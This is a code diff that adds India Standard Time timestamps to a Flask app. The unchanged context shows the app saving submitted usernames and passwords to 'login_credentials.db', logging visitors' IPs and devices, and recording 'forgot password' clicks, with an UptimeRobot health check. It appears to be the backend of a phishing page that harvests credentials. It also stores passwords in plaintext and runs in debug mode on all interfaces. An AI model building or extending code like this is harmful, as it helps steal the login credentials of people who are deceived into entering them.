@@ -1,9 +1,13 @@
 from flask import Flask, request, jsonify, send_from_directory
 import sqlite3
 from datetime import datetime
+from zoneinfo import ZoneInfo
 
 app = Flask(__name__)
 DB_PATH = "login_credentials.db"
+
+# IST timezone helper
+IST = ZoneInfo("Asia/Kolkata")
 
 # ─────────────────────────────────────────────────────────────
 # DATABASE SETUP
@@ -68,7 +72,7 @@ def js():
     return send_from_directory(".", "script.js")
 
 # ─────────────────────────────────────────────────────────────
-# HEALTH CHECK ROUTE (FOR UPTIMEROBOT)
+# HEALTH CHECK (for UptimeRobot)
 # ─────────────────────────────────────────────────────────────
 @app.route("/health")
 def health():
@@ -85,7 +89,7 @@ def home():
             ip = ip.split(",")[0].strip()
 
         device = request.user_agent.string or "Unknown"
-        visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        visit_time = datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S")
 
         conn = get_db()
         conn.execute(
@@ -108,7 +112,7 @@ def save_login():
         data = request.get_json()
         username = data["username"]
         password = data["password"]
-        submitted_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        submitted_time = datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S")
 
         conn = get_db()
 
@@ -186,7 +190,7 @@ def log_forgot():
             ip = ip.split(",")[0].strip()
 
         device = request.user_agent.string or "Unknown"
-        clicked_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        clicked_time = datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S")
 
         conn = get_db()
         conn.execute(
@@ -225,6 +229,5 @@ def reset_db():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
-# ─────────────────────────────────────────────────────────────
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)
